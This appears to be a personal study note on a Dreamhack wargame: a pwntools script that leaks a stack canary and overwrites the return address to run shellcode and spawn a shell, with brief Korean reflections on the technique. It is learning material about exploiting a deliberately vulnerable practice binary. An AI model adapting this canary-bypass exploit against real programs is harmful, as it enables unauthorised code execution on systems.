#system-hacking 
# Payload
```python
from pwn import *

# context.log_level = "debug"
context.binary = '/home/user/Desktop/Dreamhack/Exploit_ReturnToShellcode/r2s'

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process(context.binary.path)

# [1] Get information about buf
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2canary = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2canary)

# [2] Leak canary value
payload = b'A'*(buf2canary+1) # canary null byte overwrite
p.sendafter(b'Input:', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(0x7))
slog('Canary: ', canary)

# my payload
# payload = asm(shellcraft.sh())
# sh_len = len(payload)
# payload += b'A'*(buf2canary - sh_len)
# payload += p64(canary)
# payload += b'B'*0x8
# payload += p64(buf)
# p.sendafter(b'Input: ', payload)
# p.interactive()

# dreamhack payload (좀 더 간결하고 깔끔함)
# [3] Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2canary, b'A') + p64(canary) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input: ', payload)

p.interactive()
```
# 풀이 과정
- 전형적인 스택 카나리 값을 받아 다시 덮어쓰면서 리턴 주소를 쉘 코드로 지정하는 기법이다.
- 페이로드 작성 시 더 깔끔한 코드 작성 가능한 것에 염두하자.
- 아직 카나리 덮어쓸 때 필요한 1바이트 더 보내는 것, 수신 후 1바이트는 다시 \x00으로 되돌리는 것, 최종 페이로드에서 패딩 넣는 기법이 미숙한 것 같다.
- 